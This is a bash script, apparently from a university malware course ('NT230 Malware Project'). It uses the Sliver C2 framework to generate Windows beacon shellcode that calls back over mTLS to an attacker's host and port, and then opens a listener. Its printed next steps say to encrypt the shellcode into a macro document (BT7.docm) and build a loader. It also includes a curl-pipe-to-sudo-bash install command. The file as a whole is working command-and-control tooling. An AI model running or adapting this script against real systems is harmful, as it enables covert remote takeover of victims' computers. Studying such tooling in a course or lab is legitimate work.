#!/bin/bash

# Sliver C2 - Generate Shellcode & Setup Listener
# Usage: ./generate_and_listen.sh <LHOST> <LPORT>

if [ $# -lt 2 ]; then
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║   Sliver C2 - Shellcode Generator & Listener         ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo ""
    echo "Usage:"
    echo "  ./generate_and_listen.sh <LHOST> <LPORT>"
    echo ""
    echo "Example:"
    echo "  ./generate_and_listen.sh 192.168.1.100 8443"
    echo ""
    exit 1
fi

LHOST=$1
LPORT=$2
OUTPUT_FILE="shellcode.bin"

echo "[*] Sliver C2 Framework - NT230 Malware Project"
echo "[*] LHOST: $LHOST"
echo "[*] LPORT: $LPORT"
echo ""

# Check if sliver-client exists
if ! command -v sliver-client &> /dev/null; then
    echo "[-] sliver-client not found!"
    echo "[!] Install: curl https://sliver.sh/install | sudo bash"
    exit 1
fi

echo "[*] Generating beacon shellcode..."
echo ""

# Create sliver commands file
SLIVER_COMMANDS=$(mktemp)
cat > "$SLIVER_COMMANDS" << EOF
generate beacon --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --skip-symbols --save ${OUTPUT_FILE}
exit
EOF

# Generate shellcode using Sliver (pipe commands to interactive mode)
sliver-client < "$SLIVER_COMMANDS"

rm -f "$SLIVER_COMMANDS"

if [ ! -f "$OUTPUT_FILE" ]; then
    echo "[-] Failed to generate shellcode!"
    echo ""
    echo "[!] Manual generation in Sliver console:"
    echo "  sliver > generate beacon --mtls ${LHOST}:${LPORT} --os windows --arch amd64 --format shellcode --skip-symbols --save ${OUTPUT_FILE}"
    exit 1
fi

FILE_SIZE=$(stat -f%z "$OUTPUT_FILE" 2>/dev/null || stat -c%s "$OUTPUT_FILE" 2>/dev/null)
echo "[+] Shellcode generated: $OUTPUT_FILE"
echo "[+] Size: $FILE_SIZE bytes"
echo ""

echo "[*] Next steps:"
echo "  1. Encrypt: python loader/encryptor.py ${OUTPUT_FILE} BT7.docm"
echo "  2. Build: cd loader && build.bat"
echo ""

echo "[*] Starting mTLS listener on ${LHOST}:${LPORT}..."
echo ""
echo "╔════════════════════════════════════════════════════════╗"
echo "║  IMPORTANT: Manual listener setup required            ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "[*] Sliver console will open in interactive mode"
echo "[!] After it starts, run this command:"
echo ""
echo "    sliver > mtls -L ${LHOST} -l ${LPORT}"
echo ""
echo "[*] Keep the console open to maintain the listener"
echo "[*] Press Enter to start Sliver console..."
read

# Start sliver-client in interactive mode (stays open)
sliver-client

